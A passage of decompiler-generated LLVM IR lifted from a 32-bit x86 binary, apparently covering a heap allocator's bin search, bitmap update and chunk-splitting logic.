dec_label_pc_805052f.lr.ph:                       ; preds = %dec_label_pc_8050600.preheader
  %v1_8050556 = add i32 %.v1_8050473, 16
  br label %dec_label_pc_805052f

dec_label_pc_805052f:                             ; preds = %dec_label_pc_805052f.lr.ph, %dec_label_pc_8050600
  %v1_8050b29 = phi i32 [ %v0_80506009, %dec_label_pc_805052f.lr.ph ], [ %v0_8050600, %dec_label_pc_8050600 ]
  %v1_805052f = add i32 %v1_8050b29, 4
  %v2_805052f = inttoptr i32 %v1_805052f to i32*
  %v3_805052f = load i32, i32* %v2_805052f, align 4
  %v1_8050532 = add i32 %v1_8050b29, 12
  %v2_8050532 = inttoptr i32 %v1_8050532 to i32*
  %v3_8050532 = load i32, i32* %v2_8050532, align 4
  store i32 %v3_8050532, i32* @edx, align 4
  %v1_8050535 = and i32 %v3_805052f, -4
  store i32 %v1_8050535, i32* @edi, align 4
  %v9_8050542 = icmp eq i32 %v3_8050532, 134558548
  %v1_8050548 = icmp eq i1 %v9_8050542, false
  %or.cond95 = or i1 %v6_80504cb, %v1_8050548
  br i1 %or.cond95, label %dec_label_pc_8050561, label %dec_label_pc_805054a

dec_label_pc_805054a:                             ; preds = %dec_label_pc_805052f
  %v1_805054a = load i32, i32* @global_var_8053350.34, align 16
  %v12_805054a = icmp eq i32 %v1_8050b29, %v1_805054a
  %v1_8050550 = icmp eq i1 %v12_805054a, false
  br i1 %v1_8050550, label %dec_label_pc_8050561, label %dec_label_pc_8050552

dec_label_pc_8050552:                             ; preds = %dec_label_pc_805054a
  store i32 %v1_8050556, i32* %eax.global-to-local, align 4
  %v6_805055b = icmp ugt i32 %v1_8050535, %v1_8050556
  br i1 %v6_805055b, label %dec_label_pc_8050b12, label %dec_label_pc_8050561

dec_label_pc_8050561:                             ; preds = %dec_label_pc_8050552, %dec_label_pc_805054a, %dec_label_pc_805052f
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %eax.global-to-local, align 4
  %v2_8050566 = add i32 %v3_8050532, 8
  %v3_8050566 = inttoptr i32 %v2_8050566 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v3_8050566, align 4
  %v0_8050569 = load i32, i32* @edx, align 4
  store i32 %v0_8050569, i32* @global_var_8053360.36, align 4
  %v0_805056c = load i32, i32* @edi, align 4
  %v15_805056c = icmp eq i32 %v0_805056c, %.v1_8050473
  br i1 %v15_805056c, label %dec_label_pc_8050b53, label %dec_label_pc_8050576

dec_label_pc_8050576:                             ; preds = %dec_label_pc_8050561
  %v6_805057c = icmp ugt i32 %v0_805056c, 255
  br i1 %v6_805057c, label %dec_label_pc_805058f, label %dec_label_pc_805057e

dec_label_pc_805057e:                             ; preds = %dec_label_pc_8050576
  %v2_8050580 = udiv i32 %v0_805056c, 8
  store i32 %v2_8050580, i32* %esi.global-to-local, align 4
  %v1_8050583 = mul nuw i32 %v2_8050580, 8
  %v2_8050583 = add i32 %v1_8050583, 134558540
  store i32 %v2_8050583, i32* @ebx, align 4
  %v1_805058a = add i32 %v1_8050583, 134558548
  %v2_805058a = inttoptr i32 %v1_805058a to i32*
  %v3_805058a = load i32, i32* %v2_805058a, align 4
  store i32 %v3_805058a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505d8

dec_label_pc_805058f:                             ; preds = %dec_label_pc_8050576
  store i32 %v0_805056c, i32* @eax, align 4
  %v0_8050591 = call i32 @function_80503f8()
  store i32 %v0_8050591, i32* %esi.global-to-local, align 4
  %v1_8050598 = mul i32 %v0_8050591, 8
  %v2_8050598 = add i32 %v1_8050598, ptrtoint (i32* @global_var_805334c.33 to i32)
  store i32 %v2_8050598, i32* %eax.global-to-local, align 4
  %v1_805059f = add i32 %v1_8050598, add (i32 ptrtoint (i32* @global_var_805334c.33 to i32), i32 8)
  %v2_805059f = inttoptr i32 %v1_805059f to i32*
  %v3_805059f = load i32, i32* %v2_805059f, align 4
  store i32 %v3_805059f, i32* %edx.global-to-local, align 4
  store i32 %v3_805059f, i32* @ebx, align 4
  %v12_80505a8 = icmp eq i32 %v3_805059f, %v2_8050598
  br i1 %v12_80505a8, label %dec_label_pc_80505d8, label %dec_label_pc_80505ac

dec_label_pc_80505ac:                             ; preds = %dec_label_pc_805058f
  %v1_80505ac = add i32 %v1_8050598, add (i32 ptrtoint (i32* @global_var_805334c.33 to i32), i32 12)
  %v2_80505ac = inttoptr i32 %v1_80505ac to i32*
  %v3_80505ac = load i32, i32* %v2_80505ac, align 4
  store i32 %v3_80505ac, i32* @ebx, align 4
  %v0_80505af = load i32, i32* @edi, align 4
  %v2_80505af = add i32 %v3_80505ac, 4
  %v3_80505af = inttoptr i32 %v2_80505af to i32*
  %v4_80505af = load i32, i32* %v3_80505af, align 4
  %v10_80505af = icmp ult i32 %v0_80505af, %v4_80505af
  %v1_80505b2 = icmp eq i1 %v10_80505af, false
  br i1 %v1_80505b2, label %dec_label_pc_80505ba, label %dec_label_pc_80505d8

dec_label_pc_80505ba:                             ; preds = %dec_label_pc_80505ac
  %v1_80505bc = or i32 %v0_80505af, 1
  store i32 %v1_80505bc, i32* %eax.global-to-local, align 4
  store i32 %v3_805059f, i32* %ebx.global-to-local, align 4
  %v2_80505d0109 = add i32 %v3_805059f, 4
  %v3_80505d0110 = inttoptr i32 %v2_80505d0109 to i32*
  %v4_80505d0111 = load i32, i32* %v3_80505d0110, align 4
  %v10_80505d0112 = icmp ult i32 %v1_80505bc, %v4_80505d0111
  br i1 %v10_80505d0112, label %dec_label_pc_80505c1, label %dec_label_pc_80505d5

dec_label_pc_80505c1:                             ; preds = %dec_label_pc_80505ba, %dec_label_pc_80505c1
  %v0_80505d5113 = phi i32 [ %v3_80505c5, %dec_label_pc_80505c1 ], [ %v3_805059f, %dec_label_pc_80505ba ]
  store i32 %v0_80505d5113, i32* %ecx.global-to-local, align 4
  %v1_80505c5 = add i32 %v0_80505d5113, 8
  %v2_80505c5 = inttoptr i32 %v1_80505c5 to i32*
  %v3_80505c5 = load i32, i32* %v2_80505c5, align 4
  store i32 %v3_80505c5, i32* %ecx.global-to-local, align 4
  store i32 %v3_80505c5, i32* %ebx.global-to-local, align 4
  %v2_80505d0 = add i32 %v3_80505c5, 4
  %v3_80505d0 = inttoptr i32 %v2_80505d0 to i32*
  %v4_80505d0 = load i32, i32* %v3_80505d0, align 4
  %v10_80505d0 = icmp ult i32 %v1_80505bc, %v4_80505d0
  br i1 %v10_80505d0, label %dec_label_pc_80505c1, label %dec_label_pc_80505d5

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_80505c1, %dec_label_pc_80505ba
  %v0_80505d5.lcssa = phi i32 [ %v3_805059f, %dec_label_pc_80505ba ], [ %v3_80505c5, %dec_label_pc_80505c1 ]
  %v1_80505d5 = add i32 %v0_80505d5.lcssa, 12
  %v2_80505d5 = inttoptr i32 %v1_80505d5 to i32*
  %v3_80505d5 = load i32, i32* %v2_80505d5, align 4
  store i32 %v3_80505d5, i32* @ebx, align 4
  br label %dec_label_pc_80505d8

dec_label_pc_80505d8:                             ; preds = %dec_label_pc_805057e, %dec_label_pc_80505ac, %dec_label_pc_805058f, %dec_label_pc_80505d5
  %v0_80505d8 = phi i32 [ %v0_8050591, %dec_label_pc_805058f ], [ %v0_8050591, %dec_label_pc_80505d5 ], [ %v0_8050591, %dec_label_pc_80505ac ], [ %v2_8050580, %dec_label_pc_805057e ]
  %stack_var_-64.1 = phi i32 [ %v2_8050598, %dec_label_pc_805058f ], [ %v0_80505d5.lcssa, %dec_label_pc_80505d5 ], [ %v2_8050598, %dec_label_pc_80505ac ], [ %v3_805058a, %dec_label_pc_805057e ]
  %v1_80505da = urem i32 %v0_80505d8, 32
  %v2_80505da = icmp eq i32 %v1_80505da, 0
  store i32 %v1_80505da, i32* %esi.global-to-local, align 4
  store i32 %v1_80505da, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80505e4 = sdiv i32 %v0_80505d8, 32
  store i32 %v2_80505e4, i32* %edx.global-to-local, align 4
  br i1 %v2_80505da, label %dec_label_pc_8050600, label %bb

bb:                                               ; preds = %dec_label_pc_80505d8
  %v5_80505e7 = shl i32 1, %v1_80505da
  store i32 %v5_80505e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050600

dec_label_pc_8050600:                             ; preds = %dec_label_pc_80505d8, %bb
  %v5_80505e9 = phi i32 [ 1, %dec_label_pc_80505d8 ], [ %v5_80505e7, %bb ]
  %v1_80505e9 = mul nsw i32 %v2_80505e4, 4
  %v2_80505e9 = add i32 %v1_80505e9, ptrtoint (i32* @global_var_8053654.37 to i32)
  %v3_80505e9 = inttoptr i32 %v2_80505e9 to i32*
  %v4_80505e9 = load i32, i32* %v3_80505e9, align 4
  %v6_80505e9 = or i32 %v4_80505e9, %v5_80505e9
  store i32 %v6_80505e9, i32* %v3_80505e9, align 4
  %v0_80505f0 = load i32, i32* @ebx, align 4
  %v1_80505f0 = load i32, i32* @ebp, align 4
  %v2_80505f0 = add i32 %v1_80505f0, 12
  %v3_80505f0 = inttoptr i32 %v2_80505f0 to i32*
  store i32 %v0_80505f0, i32* %v3_80505f0, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80505f7 = load i32, i32* @ebp, align 4
  %v2_80505f7 = add i32 %v1_80505f7, 8
  %v3_80505f7 = inttoptr i32 %v2_80505f7 to i32*
  store i32 %stack_var_-64.1, i32* %v3_80505f7, align 4
  %v0_80505fa = load i32, i32* @ebp, align 4
  %v1_80505fa = load i32, i32* @ebx, align 4
  %v2_80505fa = add i32 %v1_80505fa, 8
  %v3_80505fa = inttoptr i32 %v2_80505fa to i32*
  store i32 %v0_80505fa, i32* %v3_80505fa, align 4
  %v0_80505fd = load i32, i32* @ebp, align 4
  %v1_80505fd = load i32, i32* @esi, align 4
  %v2_80505fd = add i32 %v1_80505fd, 12
  %v3_80505fd = inttoptr i32 %v2_80505fd to i32*
  store i32 %v0_80505fd, i32* %v3_80505fd, align 4
  %v0_8050600 = load i32, i32* @global_var_8053360.36, align 32
  store i32 %v0_8050600, i32* @ebp, align 4
  %v9_8050606 = icmp eq i32 %v0_8050600, 134558548
  %v1_805060c = icmp eq i1 %v9_8050606, false
  br i1 %v1_805060c, label %dec_label_pc_805052f, label %dec_label_pc_8050612

dec_label_pc_8050612:                             ; preds = %dec_label_pc_8050600, %dec_label_pc_8050600.preheader
  br i1 %v8_80504c3, label %dec_label_pc_80506a0, label %dec_label_pc_8050620

dec_label_pc_8050620:                             ; preds = %dec_label_pc_8050612
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050624 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050624 = add i32 %v1_8050624, ptrtoint (i32* @global_var_805334c.33 to i32)
  store i32 %v2_8050624, i32* %edx.global-to-local, align 4
  %v1_805062b = add i32 %v1_8050624, add (i32 ptrtoint (i32* @global_var_805334c.33 to i32), i32 12)
  %v2_805062b = inttoptr i32 %v1_805062b to i32*
  %storemerge1.pre = load i32, i32* %v2_805062b, align 4
  br label %dec_label_pc_805069c

dec_label_pc_8050630:                             ; preds = %dec_label_pc_805069c
  %v1_8050630 = add i32 %v4_8050647, 4
  %v2_8050630 = inttoptr i32 %v1_8050630 to i32*
  %v3_8050630 = load i32, i32* %v2_8050630, align 4
  store i32 %v3_8050630, i32* %ebx.global-to-local, align 4
  %v1_8050633 = add i32 %v4_8050647, 12
  %v2_8050633 = inttoptr i32 %v1_8050633 to i32*
  %v3_8050633 = load i32, i32* %v2_8050633, align 4
  store i32 %v3_8050633, i32* @ecx, align 4
  %v1_8050636 = and i32 %v3_8050630, -4
  store i32 %v1_8050636, i32* @ebx, align 4
  %v10_8050639 = icmp ult i32 %v1_8050636, %.v1_8050473
  br i1 %v10_8050639, label %dec_label_pc_805069c, label %dec_label_pc_805063f

dec_label_pc_805063f:                             ; preds = %dec_label_pc_8050630
  %v1_805063f = add i32 %v4_8050647, 8
  %v2_805063f = inttoptr i32 %v1_805063f to i32*
  %v3_805063f = load i32, i32* %v2_805063f, align 4
  store i32 %v3_805063f, i32* @edx, align 4
  %v1_8050642 = add i32 %v3_805063f, 12
  %v2_8050642 = inttoptr i32 %v1_8050642 to i32*
  %v3_8050642 = load i32, i32* %v2_8050642, align 4
  %v15_8050642 = icmp eq i32 %v3_8050642, %v4_8050647
  %v1_8050645 = icmp eq i1 %v15_8050642, false
  br i1 %v1_8050645, label %dec_label_pc_805064c, label %dec_label_pc_8050647

dec_label_pc_8050647:                             ; preds = %dec_label_pc_805063f
  %v1_8050647 = add i32 %v3_8050633, 8
  %v2_8050647 = inttoptr i32 %v1_8050647 to i32*
  %v3_8050647 = load i32, i32* %v2_8050647, align 4
  %v15_8050647 = icmp eq i32 %v3_8050647, %v4_8050647
  br i1 %v15_8050647, label %dec_label_pc_8050651, label %dec_label_pc_805064c

dec_label_pc_805064c:                             ; preds = %dec_label_pc_8050647, %dec_label_pc_805063f
  %v0_805064c = call i32 @function_805137f()
  store i32 %v0_805064c, i32* %eax.global-to-local, align 4
  %v0_8050651.pre = load i32, i32* @ebx, align 4
  %v0_8050657.pre = load i32, i32* @ecx, align 4
  %v1_8050657.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050651

dec_label_pc_8050651:                             ; preds = %dec_label_pc_8050647, %dec_label_pc_805064c
  %v1_8050657 = phi i32 [ %v3_805063f, %dec_label_pc_8050647 ], [ %v1_8050657.pre, %dec_label_pc_805064c ]
  %v0_8050657 = phi i32 [ %v3_8050633, %dec_label_pc_8050647 ], [ %v0_8050657.pre, %dec_label_pc_805064c ]
  %v0_8050651 = phi i32 [ %v1_8050636, %dec_label_pc_8050647 ], [ %v0_8050651.pre, %dec_label_pc_805064c ]
  %v5_8050653 = sub i32 %v0_8050651, %.v1_8050473
  store i32 %v5_8050653, i32* %esi.global-to-local, align 4
  %v2_8050657 = add i32 %v1_8050657, 12
  %v3_8050657 = inttoptr i32 %v2_8050657 to i32*
  store i32 %v0_8050657, i32* %v3_8050657, align 4
  %v0_805065a = load i32, i32* @edx, align 4
  %v1_805065a = load i32, i32* @ecx, align 4
  %v2_805065a = add i32 %v1_805065a, 8
  %v3_805065a = inttoptr i32 %v2_805065a to i32*
  store i32 %v0_805065a, i32* %v3_805065a, align 4
  %v0_805065d = load i32, i32* %esi.global-to-local, align 4
  %v0_8050660 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050660 = add i32 %v0_8050660, 8
  store i32 %v1_8050660, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_805065d, 16
  br i1 %tmp125, label %dec_label_pc_8050b61, label %dec_label_pc_8050669

dec_label_pc_8050669:                             ; preds = %dec_label_pc_8050651
  %v2_805066d = add i32 %v0_8050660, %.v1_8050473
  store i32 %v2_805066d, i32* @edx, align 4
  %v1_8050670 = or i32 %.v1_8050473, 1
  store i32 %v1_8050670, i32* %ebx.global-to-local, align 4
  %v2_8050673 = add i32 %v0_8050660, 4
  %v3_8050673 = inttoptr i32 %v2_8050673 to i32*
  store i32 %v1_8050670, i32* %v3_8050673, align 4
  %v0_8050676 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050678 = or i32 %v0_8050676, 1
  store i32 %v1_8050678, i32* %eax.global-to-local, align 4
  %v0_805067b = load i32, i32* @edx, align 4
  %v1_805067b = load i32, i32* @ebp, align 4
  %v2_805067b = add i32 %v1_805067b, 8
  %v3_805067b = inttoptr i32 %v2_805067b to i32*
  store i32 %v0_805067b, i32* %v3_805067b, align 4
  %v0_805067e = load i32, i32* @edx, align 4
  %v1_805067e = load i32, i32* @ebp, align 4
  %v2_805067e = add i32 %v1_805067e, 12
  %v3_805067e = inttoptr i32 %v2_805067e to i32*
  store i32 %v0_805067e, i32* %v3_805067e, align 4
  %v0_8050681 = load i32, i32* @edx, align 4
  %v1_8050681 = add i32 %v0_8050681, 8
  %v2_8050681 = inttoptr i32 %v1_8050681 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_8050681, align 4
  %v0_8050688 = load i32, i32* @edx, align 4
  %v1_8050688 = add i32 %v0_8050688, 12
  %v2_8050688 = inttoptr i32 %v1_8050688 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_8050688, align 4
  %v0_805068f = load i32, i32* %eax.global-to-local, align 4
  %v1_805068f = load i32, i32* @edx, align 4
  %v2_805068f = add i32 %v1_805068f, 4
  %v3_805068f = inttoptr i32 %v2_805068f to i32*
  store i32 %v0_805068f, i32* %v3_805068f, align 4
  %v0_8050692 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050692 = load i32, i32* @edx, align 4
  %v3_8050692 = add i32 %v1_8050692, %v0_8050692
  %v4_8050692 = inttoptr i32 %v3_8050692 to i32*
  store i32 %v0_8050692, i32* %v4_8050692, align 4
  br label %dec_label_pc_8050b66

dec_label_pc_805069c:                             ; preds = %dec_label_pc_8050630, %dec_label_pc_8050620
  %v4_8050647 = phi i32 [ %storemerge1.pre, %dec_label_pc_8050620 ], [ %v3_8050633, %dec_label_pc_8050630 ]
  store i32 %v4_8050647, i32* %eax.global-to-local, align 4
  %v12_805069c = icmp eq i32 %v4_8050647, %v2_8050624
  %v1_805069e = icmp eq i1 %v12_805069c, false
  br i1 %v1_805069e, label %dec_label_pc_8050630, label %dec_label_pc_80506a0

dec_label_pc_80506a0:                             ; preds = %dec_label_pc_805069c, %dec_label_pc_8050612
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80506a9 = add i32 %stack_var_-40.0.ph, 1
  %v2_80506ac = udiv i32 %v1_80506a9, 32
  store i32 %v2_80506ac, i32* @edi, align 4
  %v1_80506af = mul i32 %v1_80506a9, 8
  %v2_80506af = add i32 %v1_80506af, ptrtoint (i32* @global_var_805334c.33 to i32)
  store i32 %v2_80506af, i32* %ebx.global-to-local, align 4
  %v1_80506b6 = urem i32 %v1_80506a9, 32
  %v2_80506b6 = icmp eq i32 %v1_80506b6, 0
  store i32 %v1_80506b6, i32* %ecx.global-to-local, align 4
  %v1_80506b9 = mul nuw nsw i32 %v2_80506ac, 4
  %v2_80506b9 = add i32 %v1_80506b9, ptrtoint (i32* @global_var_8053654.37 to i32)
  %v3_80506b9 = inttoptr i32 %v2_80506b9 to i32*
  %v4_80506b9 = load i32, i32* %v3_80506b9, align 4
  store i32 %v4_80506b9, i32* %edx.global-to-local, align 4
  br i1 %v2_80506b6, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_80506a0
  %v5_80506c0 = shl i32 1, %v1_80506b6
  store i32 %v5_80506c0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80506a0, %bb88, %dec_label_pc_8050701
  %v1_80506c2 = phi i32 [ %v1_80506c2.pre, %dec_label_pc_8050701 ], [ %v4_80506b9, %bb88 ], [ %v4_80506b9, %dec_label_pc_80506a0 ]
  %v0_80506c6 = phi i32 [ %v0_80506c2.pre, %dec_label_pc_8050701 ], [ %v5_80506c0, %bb88 ], [ 1, %dec_label_pc_80506a0 ]
  %tmp89 = icmp ule i32 %v0_80506c6, %v1_80506c2
  %v1_80506c6 = icmp eq i32 %v0_80506c6, 0
  %v1_80506c8 = icmp eq i1 %v1_80506c6, false
  %or.cond = and i1 %tmp89, %v1_80506c8
  br i1 %or.cond, label %dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge, label %dec_label_pc_80506ca.preheader

dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge: ; preds = %.preheader
  %v0_80506f17.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80506f6.preheader

dec_label_pc_80506ca.preheader:                   ; preds = %.preheader
  %v0_80506ca.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80506ca

dec_label_pc_80506ca:                             ; preds = %dec_label_pc_80506ca.preheader, %dec_label_pc_80506d4
  %v0_80506ca = phi i32 [ %v0_80506ca.pre, %dec_label_pc_80506ca.preheader ], [ %v1_80506ca, %dec_label_pc_80506d4 ]
  %v1_80506ca = add i32 %v0_80506ca, 1
  store i32 %v1_80506ca, i32* @edi, align 4
  %v6_80506ce = icmp ugt i32 %v1_80506ca, 2
  br i1 %v6_80506ce, label %dec_label_pc_805077d, label %dec_label_pc_80506d4

dec_label_pc_80506d4:                             ; preds = %dec_label_pc_80506ca
  %v1_80506d4 = mul i32 %v1_80506ca, 4
  %v2_80506d4 = add i32 %v1_80506d4, ptrtoint (i32* @global_var_8053654.37 to i32)
  %v3_80506d4 = inttoptr i32 %v2_80506d4 to i32*
  %v4_80506d4 = load i32, i32* %v3_80506d4, align 4
  store i32 %v4_80506d4, i32* %edx.global-to-local, align 4
  %v1_80506db = icmp eq i32 %v4_80506d4, 0
  br i1 %v1_80506db, label %dec_label_pc_80506ca, label %dec_label_pc_80506df

dec_label_pc_80506df:                             ; preds = %dec_label_pc_80506d4
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80506e6 = mul i32 %v1_80506ca, 256
  store i32 %v2_80506e6, i32* %eax.global-to-local, align 4
  %v1_80506e9 = add i32 %v2_80506e6, ptrtoint (i32* @global_var_805334c.33 to i32)
  store i32 %v1_80506e9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80506f6.preheader

dec_label_pc_80506f6.preheader:                   ; preds = %dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge, %dec_label_pc_80506df
  %v0_80506f17 = phi i32 [ %v1_80506e9, %dec_label_pc_80506df ], [ %v0_80506f17.pre, %dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80506df ], [ %v0_80506c6, %dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge ]
  %v0_8050708 = phi i32 [ %v4_80506d4, %dec_label_pc_80506df ], [ %v1_80506c2, %dec_label_pc_80506c6.dec_label_pc_80506f6.preheader_crit_edge ]
  %v2_80506f64 = and i32 %v0_8050708, %esi.promoted
  %v3_80506f65 = icmp eq i32 %v2_80506f64, 0
  br i1 %v3_80506f65, label %dec_label_pc_80506f1, label %dec_label_pc_80506fa

dec_label_pc_80506f1:                             ; preds = %dec_label_pc_80506f6.preheader, %dec_label_pc_80506f1
  %v2_80506f418 = phi i32 [ %v2_80506f4, %dec_label_pc_80506f1 ], [ %esi.promoted, %dec_label_pc_80506f6.preheader ]
  %v0_80506f18 = phi i32 [ %v1_80506f1, %dec_label_pc_80506f1 ], [ %v0_80506f17, %dec_label_pc_80506f6.preheader ]
  %v1_80506f1 = add i32 %v0_80506f18, 8
  %v2_80506f4 = mul i32 %v2_80506f418, 2
  %v2_80506f6 = and i32 %v2_80506f4, %v0_8050708
  %v3_80506f6 = icmp eq i32 %v2_80506f6, 0
  br i1 %v3_80506f6, label %dec_label_pc_80506f1, label %dec_label_pc_80506f6.dec_label_pc_80506fa_crit_edge

dec_label_pc_80506f6.dec_label_pc_80506fa_crit_edge: ; preds = %dec_label_pc_80506f1
  store i32 %v1_80506f1, i32* %ebx.global-to-local, align 4
  store i32 %v2_80506f4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80506fa

dec_label_pc_80506fa:                             ; preds = %dec_label_pc_80506f6.dec_label_pc_80506fa_crit_edge, %dec_label_pc_80506f6.preheader
  %v0_805070a = phi i32 [ %v2_80506f4, %dec_label_pc_80506f6.dec_label_pc_80506fa_crit_edge ], [ %esi.promoted, %dec_label_pc_80506f6.preheader ]
  %v1_8050724 = phi i32 [ %v1_80506f1, %dec_label_pc_80506f6.dec_label_pc_80506fa_crit_edge ], [ %v0_80506f17, %dec_label_pc_80506f6.preheader ]
  %v1_80506fa = add i32 %v1_8050724, 12
  %v2_80506fa = inttoptr i32 %v1_80506fa to i32*
  %v3_80506fa = load i32, i32* %v2_80506fa, align 4
  store i32 %v3_80506fa, i32* %ecx.global-to-local, align 4
  %v12_80506fd = icmp eq i32 %v3_80506fa, %v1_8050724
  %v1_80506ff = icmp eq i1 %v12_80506fd, false
  br i1 %v1_80506ff, label %dec_label_pc_8050715, label %dec_label_pc_8050701

dec_label_pc_8050701:                             ; preds = %dec_label_pc_80506fa
  %v1_8050703 = add i32 %v3_80506fa, 8
  store i32 %v1_8050703, i32* %ebx.global-to-local, align 4
  %v1_8050706 = sub i32 -1, %v0_805070a
  store i32 %v1_8050706, i32* %eax.global-to-local, align 4
  %v2_8050708 = and i32 %v0_8050708, %v1_8050706
  store i32 %v2_8050708, i32* %edx.global-to-local, align 4
  %v2_805070a = mul i32 %v0_805070a, 2
  store i32 %v2_805070a, i32* %esi.global-to-local, align 4
  %v1_805070c = load i32, i32* @edi, align 4
  %v2_805070c = mul i32 %v1_805070c, 4
  %v3_805070c = add i32 %v2_805070c, ptrtoint (i32* @global_var_8053654.37 to i32)
  %v4_805070c = inttoptr i32 %v3_805070c to i32*
  store i32 %v2_8050708, i32* %v4_805070c, align 4
  %v0_80506c2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80506c2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050715:                             ; preds = %dec_label_pc_80506fa
  %v1_8050715 = add i32 %v3_80506fa, 4
  %v2_8050715 = inttoptr i32 %v1_8050715 to i32*
  %v3_8050715 = load i32, i32* %v2_8050715, align 4
  store i32 %v3_8050715, i32* %edx.global-to-local, align 4
  %v1_8050718 = add i32 %v3_80506fa, 12
  %v2_8050718 = inttoptr i32 %v1_8050718 to i32*
  %v3_8050718 = load i32, i32* %v2_8050718, align 4
  store i32 %v3_8050718, i32* %eax.global-to-local, align 4
  %v1_805071b = and i32 %v3_8050715, -4
  store i32 %v1_805071b, i32* @edx, align 4
  %v5_8050720 = sub i32 %v1_805071b, %.v1_8050473
  store i32 %v5_8050720, i32* %esi.global-to-local, align 4
  store i32 %v3_8050718, i32* %v2_80506fa, align 4
  %v0_8050727 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050727 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050727 = add i32 %v1_8050727, 8
  %v3_8050727 = inttoptr i32 %v2_8050727 to i32*
  store i32 %v0_8050727, i32* %v3_8050727, align 4
  %v0_805072a = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_805072a, 16
  br i1 %tmp126, label %dec_label_pc_805072f, label %dec_label_pc_8050736

dec_label_pc_805072f:                             ; preds = %dec_label_pc_8050715
  %v0_805072f = load i32, i32* %ecx.global-to-local, align 4
  %v1_805072f = load i32, i32* @edx, align 4
  %v2_805072f = add i32 %v0_805072f, 4
  %v3_805072f = add i32 %v2_805072f, %v1_805072f
  %v4_805072f = inttoptr i32 %v3_805072f to i32*
  %v5_805072f = load i32, i32* %v4_805072f, align 4
  %v6_805072f = or i32 %v5_805072f, 1
  store i32 %v6_805072f, i32* %v4_805072f, align 4
  br label %dec_label_pc_8050775

dec_label_pc_8050736:                             ; preds = %dec_label_pc_8050715
  store i32 %.v1_8050473, i32* %eax.global-to-local, align 4
  %v0_805073f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805073f = add i32 %v0_805073f, %.v1_8050473
  store i32 %v2_805073f, i32* @edx, align 4
  %v1_8050742 = load i32, i32* @ebp, align 4
  %v2_8050742 = add i32 %v1_8050742, 8
  %v3_8050742 = inttoptr i32 %v2_8050742 to i32*
  store i32 %v2_805073f, i32* %v3_8050742, align 4
  %v0_8050745 = load i32, i32* @edx, align 4
  %v1_8050745 = load i32, i32* @ebp, align 4
  %v2_8050745 = add i32 %v1_8050745, 12
  %v3_8050745 = inttoptr i32 %v2_8050745 to i32*
  store i32 %v0_8050745, i32* %v3_8050745, align 4
  %v0_8050748 = load i32, i32* @edx, align 4
  %v1_8050748 = add i32 %v0_8050748, 8
  %v2_8050748 = inttoptr i32 %v1_8050748 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_8050748, align 4
  %v0_805074f = load i32, i32* @edx, align 4
  %v1_805074f = add i32 %v0_805074f, 12
  %v2_805074f = inttoptr i32 %v1_805074f to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_805074f, align 4
  br i1 %v6_80504cb, label %dec_label_pc_805075e, label %dec_label_pc_8050758

dec_label_pc_8050758:                             ; preds = %dec_label_pc_8050736
  %v0_8050758 = load i32, i32* @edx, align 4
  store i32 %v0_8050758, i32* @global_var_8053350.34, align 16
  br label %dec_label_pc_805075e

dec_label_pc_805075e:                             ; preds = %dec_label_pc_8050736, %dec_label_pc_8050758
  %v4_805075e = or i32 %.v1_8050473, 1
  %v0_8050763 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805075e, i32* %ebx.global-to-local, align 4
  %v1_8050769 = or i32 %v0_8050763, 1
  store i32 %v1_8050769, i32* %eax.global-to-local, align 4
  %v1_805076c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805076c = add i32 %v1_805076c, 4
  %v3_805076c = inttoptr i32 %v2_805076c to i32*
  store i32 %v4_805075e, i32* %v3_805076c, align 4
  %v0_805076f = load i32, i32* %esi.global-to-local, align 4
  %v1_805076f = load i32, i32* @edx, align 4
  %v3_805076f = add i32 %v1_805076f, %v0_805076f
  %v4_805076f = inttoptr i32 %v3_805076f to i32*
  store i32 %v0_805076f, i32* %v4_805076f, align 4
  %v0_8050772 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050772 = load i32, i32* @edx, align 4
  %v2_8050772 = add i32 %v1_8050772, 4
  %v3_8050772 = inttoptr i32 %v2_8050772 to i32*
  store i32 %v0_8050772, i32* %v3_8050772, align 4
  br label %dec_label_pc_8050775

